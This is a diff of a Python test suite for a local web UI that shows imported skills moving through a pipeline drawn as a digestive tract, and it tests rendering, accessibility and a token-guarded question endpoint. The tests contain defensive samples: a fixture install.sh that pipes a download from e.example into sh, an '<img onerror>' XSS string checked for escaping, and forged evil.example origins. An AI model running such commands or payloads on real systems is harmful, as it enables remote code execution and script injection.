@@ -115,6 +115,16 @@ class UiCase(unittest.TestCase):
         (folder / "proposals.md").write_text("# <h1>Proposal</h1>\n", encoding="utf-8")
         return folder
 
+    def imported_food(self):
+        """A food registered offline by importing a record (it waits at 入口 for its taste)."""
+        catalog.cmd_import_report(self.project, "", str(self.hostile_report()))
+        catalog.refresh_view(self.project)
+        return "hostile-food"
+
+    def ask(self, **body):
+        status, headers, raw = self.request("POST", ui.QUESTION_PATH, body)
+        return status, headers, raw
+
     # ---------------------------------------------------------------- server
 
     def start(self, **kwargs):
@@ -258,6 +268,91 @@ class ServerGuardTests(UiCase):
             envelope = self.action(name, params, expect_ok=False)
             self.assertEqual(envelope["code"], 2, (name, params))
 
+    def test_served_page_carries_the_tract_renderer(self):
+        self.start()
+        status, _headers, raw = self.request("GET", "/", token=False)
+        self.assertEqual(status, 200)
+        for marker in ('<svg id="tract"', 'id="pick"', 'id="detail"', 'id="feed"', "<title>OAW 消化道</title>"):
+            self.assertIn(marker, raw.decode("utf-8"))
+        status, headers, raw = self.request("GET", "/app.js", token=False)
+        self.assertEqual((status, headers["Content-Type"]), (200, "text/javascript; charset=utf-8"))
+        script = raw.decode("utf-8")
+        for needle in ("function drawTract(table, foods)", "function bolusOf(table, food, index)", "function tractShape(narrow, count)",
+                       "function drawStop(", "function drawExits(", "function blockerBox(", "function askBox(", "wall.getTotalLength()",
+                       "document.createElementNS(SVG_NS, tag)"):
+            self.assertIn(needle, script)
+        status, _headers, raw = self.request("GET", "/style.css", token=False)
+        css = raw.decode("utf-8")
+        for needle in (".tract-svg .wave", ".bolus .badge.owner circle { fill: var(--you); }", ".bolus .badge.optional circle { fill: var(--plan); }",
+                       '@media (prefers-color-scheme: dark)', ':root[data-theme="dark"]'):
+            self.assertIn(needle, css)
+        self.assertEqual(self.api("/api/meta")["question_chars"], catalog.QUESTION_CHARS)
+        payload = self.api("/api/view")
+        # Every stop the page draws takes its organ caption from view.json (catalog_core.PIPELINE_ORGANS_ZH).
+        self.assertEqual([s["organ_zh"] for s in payload["view"]["pipeline"]["stages"]],
+                         ["口", "食道", "胃", "十二指腸", "肝", "小腸", "大腸", "門靜脈", "全身"])
+        self.assertEqual(payload["questions"], [])
+
+    def test_questions_need_the_token_and_land_in_the_project(self):
+        self.start()
+        food = self.imported_food()
+        body = {"food": food, "stage": "intake", "question": "這個卡點是什麼意思？"}
+        path = self.project / ".oaw/catalog/questions.jsonl"
+        for kwargs in ({"token": False}, {"token": "wrong-" + "x" * 40}, {"token": self.token[:-1]}, {"host": "evil.example"},
+                       {"headers": {"Origin": "http://evil.example"}}, {"headers": {"Sec-Fetch-Site": "cross-site"}}):
+            status, headers, _raw = self.request("POST", ui.QUESTION_PATH, body, **kwargs)
+            self.assertEqual(status, 403, kwargs)
+            self.assertNotIn("Access-Control-Allow-Origin", headers)
+        self.assertFalse(path.exists())
+        self.assertEqual(self.request("GET", ui.QUESTION_PATH)[0], 405)
+        self.assertEqual(self.request("POST", ui.QUESTION_PATH, json.dumps(body).encode(), headers={"Content-Type": "text/plain"})[0], 415)
+        self.assertFalse(path.exists())
+        status, _headers, raw = self.ask(**body)
+        self.assertEqual(status, 200, raw)
+        answer = json.loads(raw)
+        record = answer["question"]
+        self.assertEqual({k: record[k] for k in ("food", "stage", "question", "status")},
+                         {"food": food, "stage": "intake", "question": "這個卡點是什麼意思？", "status": "open"})
+        self.assertRegex(record["time"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
+        self.assertEqual(answer["path"], ".oaw/catalog/questions.jsonl")
+        self.assertEqual([json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()], [record])
+        # Raw catalog state stays on this machine: the catalog's .gitignore does not let questions be committed.
+        ignore = (self.project / ".oaw/catalog/.gitignore").read_text(encoding="utf-8")
+        self.assertIn("*\n", ignore)
+        self.assertNotIn("questions", ignore)
+        # The brief carries the food's facts, ready to paste into the conversation.
+        for needle in ("食物：example/hostile-food（hostile-food，repo）", "卡在哪：入口：還沒送去試吃", "依據：D4：", "你不處理會怎樣：",
+                       "問題：這個卡點是什麼意思？"):
+            self.assertIn(needle, answer["brief"])
+        self.assertEqual([q["id"] for q in self.api("/api/view")["questions"]], [record["id"]])
+        self.assertEqual(self.server.app.jobs, {})  # recording a question runs no engine action
+        self.assertEqual(catalog.cmd_questions(self.project)["open"], 1)
+
+    def test_questions_are_capped_and_sanitized(self):
+        self.start()
+        food = self.imported_food()
+
+        def refused(**body):
+            status, _headers, raw = self.ask(**{"food": food, "stage": "intake", "question": "ok", **body})
+            self.assertEqual(status, 400, raw)
+            return json.loads(raw)["error_zh"]
+        self.assertEqual(refused(question="x" * (catalog.QUESTION_CHARS + 1)), "問題太長：最多 500 字。")
+        self.assertEqual(refused(question=" \u200b\u202e\u0007 "), "問題是空的：先寫下你想問什麼。")
+        self.assertEqual(refused(question=["not", "text"]), "要寫明哪樣食物、哪一站和問題的文字。")
+        self.assertEqual(refused(stage="warp-speed"), "沒有這一站。")
+        self.assertEqual(refused(food="nobody"), "找不到這樣食物。")
+        status, _headers, _raw = self.request("POST", ui.QUESTION_PATH, b"{}", headers={"Content-Length": str(ui.MAX_QUESTION_BODY + 1)})
+        self.assertEqual(status, 413)
+        self.assertFalse((self.project / ".oaw/catalog/questions.jsonl").exists())
+        hostile = "<b>why</b>\u202e\u0007 & <img src=x onerror=alert(1)>\n\nnext"
+        status, _headers, raw = self.ask(food=food, stage="intake", question=hostile)
+        self.assertEqual(status, 200, raw)
+        for byte in (b"<", b">", b"&"):
+            self.assertNotIn(byte, raw)
+        self.assertEqual(json.loads(raw)["question"]["question"], "<b>why</b> & <img src=x onerror=alert(1)> next")
+        stored = json.loads((self.project / ".oaw/catalog/questions.jsonl").read_text(encoding="utf-8"))
+        self.assertEqual(stored["question"], "<b>why</b> & <img src=x onerror=alert(1)> next")
+
 
 class NamingTests(unittest.TestCase):
     def test_the_web_command_is_ui_with_no_old_alias(self):
@@ -285,34 +380,44 @@ class PipelinePageTests(unittest.TestCase):
         self.assertIsNone(self.GAME.search("display: grid; replay; playbook; 關口"))  # unrelated words are not caught
         self.assertIsNotNone(self.GAME.search("固定關卡"))  # a game "level" is caught
 
-    def test_pipeline_is_the_main_screen_with_two_inlets(self):
+    def test_the_tract_is_the_main_screen_with_two_inlets(self):
+        """D23: one digestive tract across the top, the food picker, then the selected food beside the two inlets."""
         page = (UI / "index.html").read_text(encoding="utf-8")
-        self.assertLess(page.index('id="pipeline"'), page.index('id="detail"'))
-        self.assertLess(page.index('id="pipeline"'), page.index('id="my-oaw"'))
-        for marker in ('id="inlet-scout"', "每週偵查 → 相關性過濾 → 你確認", 'id="inlet-named"', "你點名", 'class="merge"',
-                       'id="track"', 'id="pipe-empty"', 'id="legend"'):
+        for later in ('id="pick"', 'id="detail"', 'id="feed"', 'id="my-oaw"'):
+            self.assertLess(page.index('id="pipeline"'), page.index(later))
+        self.assertLess(page.index('id="detail"'), page.index('id="my-oaw"'))
+        for marker in ('id="inlet-scout"', "每週偵查 → 相關性過濾 → 你確認", 'id="inlet-named"', "你點名", '<svg id="tract"',
+                       'id="pipe-empty"', 'id="legend"', 'id="pipe-tools"', "<title>OAW 消化道</title>"):
             self.assertIn(marker, page)
         script = (UI / "app.js").read_text(encoding="utf-8")
-        # The stage table comes from view.json; the page has no stage list of its own.
+        # The stage table, organ captions included, comes from view.json; the page has no stage list of its own.
         self.assertIn("S.view && S.view.pipeline", script)
-        for name in ("入口", "封存", "盲審", "核准"):
+        self.assertIn("txt(stage.organ_zh, 6)", script)
+        for name in ("入口", "封存", "盲審", "核准", "口", "食道", "十二指腸", "門靜脈", "全身"):
             self.assertNotIn(f"'{name}'", script)
+        # The two inlets are drawn into the mouth and open their forms.
+        self.assertIn("{ id: 'inlet-scout', tag: 'A 每週偵查'", script)
+        self.assertIn("{ id: 'inlet-named', tag: 'B 你點名'", script)
 
-    def test_moves_animate_with_css_transitions_and_respect_reduced_motion(self):
+    def test_moves_glide_along_the_tube_and_respect_reduced_motion(self):
         css = (UI / "style.css").read_text(encoding="utf-8")
-        self.assertRegex(css, r"\.token\.travel \{[^}]*transition: transform")
+        self.assertRegex(css, r"\.tract-svg \.wave \{[^}]*animation: peristalsis")
+        self.assertRegex(css, r"\.bolus \.ring\.spin \{[^}]*animation: spin")
+        self.assertRegex(css, r"\.bob \{ animation: bob")
         reduced = css[css.index("@media (prefers-reduced-motion: reduce)"):]
-        self.assertIn(".token.travel { transition: none !important; }", reduced)
-        self.assertIn("transition: none !important", reduced)
+        self.assertIn("*, *::before, *::after { animation: none !important; transition: none !important; }", reduced)
+        self.assertIn(".tract-svg .wave, .bolus .ring.spin, .bob, .seg.st-current { animation: none !important; }", reduced)
         script = (UI / "app.js").read_text(encoding="utf-8")
         self.assertIn("matchMedia('(prefers-reduced-motion: reduce)')", script)
+        # A bolus whose stop changed glides along the tube; with reduced motion it simply appears there.
         self.assertIn("if (!before.size || reducedMotion()) return;", script)
+        self.assertIn("const p = wall.getPointAtLength(from + (to - from) * eased);", script)
         self.assertIn("behavior: reducedMotion() ? 'auto' : 'smooth'", script)
 
     def test_planned_stages_draw_no_button_and_actions_call_existing_endpoints(self):
         script = (UI / "app.js").read_text(encoding="utf-8")
-        self.assertIn("planned ? '' : stageButtons(stage)", script)
-        self.assertIn("if (planned) return cell;", script)
+        self.assertIn("(stageIsPlanned(stage) ? '' : stageButtons(stage))", script)
+        self.assertIn("if (!stage || stageIsPlanned(stage) || bolus.running) return box;", script)
         # Owner codes stay on the terminal: a terminal action is text on the page, never a button.
         self.assertIn("if (action.where === 'terminal') {", script)
         core = catalog.core
@@ -326,7 +431,7 @@ class PipelinePageTests(unittest.TestCase):
 
     # ---- review regressions on the page (D19)
 
-    def test_a_running_taste_never_sends_the_token_back_to_an_older_view(self):
+    def test_a_running_taste_never_sends_the_bolus_back_to_an_older_view(self):
         script = (UI / "app.js").read_text(encoding="utf-8")
         follow = script[script.index("async function follow("):script.index("async function settle(")]
         # Only a non-null live stage replaces the last one; the live stage is cleared after the final view loads.
@@ -335,9 +440,10 @@ class PipelinePageTests(unittest.TestCase):
         self.assertIn("S.live = null;\n    await refresh(true);", script)
         self.assertEqual(script.count("await settle();"), 2)
         # Glides go forward; a backward glide needs the engine's own stage to have changed.
-        self.assertIn("if (back && prev.engine === node.dataset.engine) continue;", script)
-        # The header counts come from the same place as the token.
-        self.assertIn("const at = hereOf(table, food);", script)
+        self.assertIn("if (back && from.engine === to.engine) continue;", script)
+        # The bolus, the picker and the progress bar take their stop from the same place.
+        self.assertIn("stage: hereOf(table, food), running: running,", script)
+        self.assertIn("const here = bolus.stage;", script)
 
     def test_the_feed_result_does_not_borrow_the_inlet_connector_class(self):
         script = (UI / "app.js").read_text(encoding="utf-8")
@@ -347,17 +453,26 @@ class PipelinePageTests(unittest.TestCase):
         self.assertIn(".feed-lines .feed-merge {", css)
         self.assertNotIn(".feed-lines .merge", css)
 
-    def test_narrow_screens_show_the_stages_without_food_and_keep_the_header_buttons(self):
+    def test_narrow_screens_get_the_tall_tract_without_sideways_scroll(self):
         script = (UI / "app.js").read_text(encoding="utf-8")
         css = (UI / "style.css").read_text(encoding="utf-8")
-        page = (UI / "index.html").read_text(encoding="utf-8")
-        self.assertIn("foods.length ? foods.map((food) => lane(table, food)) : [stageList(table)]", script)
-        narrow = css[css.index("@media (max-width: 1099.98px)"):]
-        narrow = narrow[:narrow.index("\n}\n")]
-        self.assertIn(".trow.stage-list { display: grid; }", narrow)
-        self.assertIn(".pipe-tools { display: flex;", narrow)
-        self.assertIn('id="pipe-tools"', page)
-        self.assertIn("automationChip(table, stage.automation)));", script)  # every narrow cell head names its automation
+        # Below 620 px the tract is one wavy column; with no food it still draws every stop and one sentence.
+        self.assertIn("const narrow = (box.parentNode.clientWidth || 1000) < 620;", script)
+        self.assertIn("return { kind: 'tall', w: 360,", script)
+        self.assertIn("drawTract(table, foods);", script)
+        self.assertIn("empty.textContent = foods.length ? '' : txt(table.empty_zh, 200);", script)
+        # Every stop names its organ and whether it is automated, owner, mixed or planned.
+        self.assertIn("`${txt(stage.organ_zh, 6)} · ${automationName(table, stage.automation)}`", script)
+        self.assertIn(".tract-svg { display: block; width: 100%; height: auto; }", css)
+        self.assertIn(".detail-grid { display: grid; gap: 16px; grid-template-columns: minmax(0, 1fr);", css)
+        phone = css[css.index("@media (max-width: 560px)"):]
+        phone = phone[:phone.index("\n}\n")]
+        self.assertIn(".explain dl { grid-template-columns: minmax(0, 1fr); gap: 2px; }", phone)
+        self.assertIn("overflow-x: hidden;", css)
+        # Keyboard: a bolus is a focusable button with a visible focus ring; Enter or Space selects it.
+        self.assertIn("tabindex: 0, role: 'button', 'aria-pressed': String(selected)", script)
+        self.assertIn("if (e.key === 'Enter' || e.key === ' ') {", script)
+        self.assertIn(".bolus:focus-visible .body { stroke: var(--you); stroke-width: 4; }", css)
 
     def test_toast_colour_follows_the_worst_tasted_verdict(self):
         script = (UI / "app.js").read_text(encoding="utf-8")
@@ -381,6 +496,24 @@ class PipelinePageTests(unittest.TestCase):
         self.assertEqual(catalog.core.PIPELINE_ACTIONS["forget"]["label_zh"], "忘掉這樣食物")
         command = ui.menu_command(Path("/projects/demo"))
         self.assertRegex(command, r'^python3? ".+catalog\.py" menu --target ".+demo"$')
+
+    def test_blocker_and_ask_boxes_show_view_data_only(self):
+        script = (UI / "app.js").read_text(encoding="utf-8")
+        blocker = script[script.index("function blockerBox("):script.index("function currentActions(")]
+        for needle in ("(food.pipeline || {}).blocker", "blocker.where_zh", "blocker.basis_zh", "blocker.if_ignored_zh", "blocker.unknown_zh",
+                       "'卡在哪'", "'依據'", "'你不處理會怎樣'", "'紀錄沒寫的'", "'紀錄裡沒有寫'"):
+            self.assertIn(needle, blocker)
+        asking = script[script.index("function askBox("):script.index("function splitBar(")]
+        for needle in ("api('/api/question', { food: food.id, stage: stage, question: question })", "已記下，Claude 會在對話裡回答",
+                       "copyText(last.brief, pre, '已複製：貼到和 Claude 的對話裡。')", "maxlength: String(limit)",
+                       "S.questions.filter((q) => q.food === food.id)"):
+            self.assertIn(needle, asking)
+        presets = re.search(r"const PRESET_QUESTIONS = \[([^\]]*)\];", script).group(1)
+        self.assertEqual(re.findall(r"'([^']+)'", presets), ["這個卡點是什麼意思？", "不處理會怎樣？", "你建議怎麼做？為什麼？"])
+        self.assertIn("await navigator.clipboard.writeText(text);", script)
+        # The page has no model of its own: it never calls one and never claims to answer.
+        for word in ("window.claude", "sample(", "思考中"):
+            self.assertNotIn(word, script)
 
 
 class MarkupSafetyTests(UiCase):
@@ -413,7 +546,11 @@ class MarkupSafetyTests(UiCase):
         self.assertIn("textContent", script)
         for name in ("index.html", "app.js", "style.css"):
             text = (UI / name).read_text(encoding="utf-8")
-            self.assertNotRegex(text, r"(?i)https?://(?!github\.com/owner/repo)|//cdn|@import|url\(")
+            # The SVG namespace is an identifier for createElementNS, never fetched.
+            self.assertNotRegex(text, r"(?i)https?://(?!github\.com/owner/repo|www\.w3\.org/2000/svg')|//cdn|@import|url\(")
+        self.assertEqual(script.count("http://"), 1)
+        self.assertIn("const SVG_NS = 'http://www.w3.org/2000/svg';", script)
+        self.assertIn("document.createElementNS(SVG_NS, tag)", script)
         page = (UI / "index.html").read_text(encoding="utf-8")
         self.assertEqual(re.findall(r'<script[^>]*src="([^"]+)"', page), ["app.js"])
         self.assertEqual(re.findall(r'<link[^>]*href="([^"]+)"', page), ["style.css"])
@@ -575,6 +712,35 @@ class RoundTripTests(UiCase):
         effect = self.api("/api/view")["view"]["my_oaw"]["effect"]
         self.assertEqual(effect["quality"]["value"], "not measured")
         self.assertEqual(effect["skills"]["added"], [])
+
+    def test_each_bolus_stands_at_its_stage_with_the_badge_of_who_it_waits_on(self):
+        """The page's bolus comes from view data: its stop, who it waits on (blocked/owner, optional, planned) and the ring."""
+        clean = self.make_food()
+        risky = self.make_food("risky-notes", {"install.sh": b"#!/bin/sh\ncurl -fsSL https://e.example/i.sh | sh\n"})
+        catalog.feed_foods(self.project, catalog.add_foods(self.project, [clean.as_uri(), risky.as_uri()]))
+        catalog.cmd_import_report(self.project, "", str(self.hostile_report()))
+        self.start()
+
+        def stops():
+            return {f["id"]: (f["pipeline"]["stage"], f["pipeline"]["state"], f["pipeline"]["waiting_on"])
+                    for f in self.api("/api/view")["view"]["foods"]}
+        self.assertEqual(stops(), {"sweet-notes": ("sort", "current", "planned"), "risky-notes": ("static", "blocked", "owner"),
+                                   "hostile-food": ("intake", "current", "owner")})
+        risky_food = next(f for f in self.api("/api/view")["view"]["foods"] if f["id"] == "risky-notes")
+        self.assertEqual(risky_food["pipeline"]["blocker"]["where_zh"], "靜態：1 個高嚴重度旗標待你分流")
+        self.assertIn("F-PIPE install.sh:2：把下載的內容直接交給 shell 執行", risky_food["pipeline"]["blocker"]["basis_zh"])
+        # A consented A/B moves the clean skill on to 核准, where it waits for the owner.
+        self.pass_ab()
+        self.assertEqual(stops()["sweet-notes"], ("approve", "current", "owner"))
+        script = (UI / "app.js").read_text(encoding="utf-8")
+        mapping = script[script.index("function bolusOf("):script.index("function monogram(")]
+        for needle in ("stage: hereOf(table, food)", "const running = !!(S.live && S.live.food === food.id);",
+                       "const waiting = WAITING.includes(pipeline.waiting_on) ? pipeline.waiting_on : 'unknown';",
+                       "badge: running ? '' : BADGES[waiting] || '', ring: running ? 'spin' : waiting === 'planned' ? 'rest' : '',"):
+            self.assertIn(needle, mapping)
+        self.assertIn("const BADGES = { owner: '!', optional: '?' };", script)
+        self.assertIn("const WAITING = ['owner', 'optional', 'planned', 'none'];", script)
+        self.assertEqual(set(catalog.core.PIPELINE_WAITING_ZH), {"owner", "optional", "planned", "none"})
 
 
 @unittest.skipUnless(GIT, "git is required for local fixture repositories")
@@ -768,13 +934,16 @@ class StatusViewTests(UiCase):
 
     def test_progress_colours_never_make_a_bad_result_green(self):
         css = (UI / "style.css").read_text(encoding="utf-8")
-        # Passed stages are neutral progress; only the token takes the verdict family's colour.
-        self.assertNotIn("--good", re.search(r"\.dot\.st-done \{([^}]*)\}", css).group(1))
-        self.assertNotIn("--good", re.search(r"\.cell\.st-done::before[^{]*\{([^}]*)\}", css).group(1))
-        self.assertNotIn("--good", re.search(r"\.dot\.st-partial \{([^}]*)\}", css).group(1))
-        token = re.search(r"\n\.token \{([^}]*)\}", css).group(1)
-        self.assertIn("var(--fam)", token)
-        self.assertNotIn("--good", token)
+        # Passed stages and the bolus take the food's own colour, never a verdict colour; only the card badge does.
+        for rule in (r"\.tract-svg \.stop\.st-done \.dot \{([^}]*)\}", r"\.tract-svg \.stop\.st-partial \.dot \{([^}]*)\}",
+                     r"\.seg\.st-done \{([^}]*)\}", r"\.seg\.st-partial \{([^}]*)\}", r"\.bolus \.body \{([^}]*)\}",
+                     r"\.tract-svg \.trail \{([^}]*)\}"):
+            body = re.search(rule, css).group(1)
+            self.assertIn("var(--food)", body, rule)
+            for colour in ("--good", "--absorb", "--fam"):
+                self.assertNotIn(colour, body, rule)
+        badge = re.search(r"\n\.badge \{([^}]*)\}", css).group(1)
+        self.assertIn("var(--fam)", badge)
         self.assertNotIn("color: #fff", css)
         self.assertIn("--on-bad", css)
         script = (UI / "app.js").read_text(encoding="utf-8")
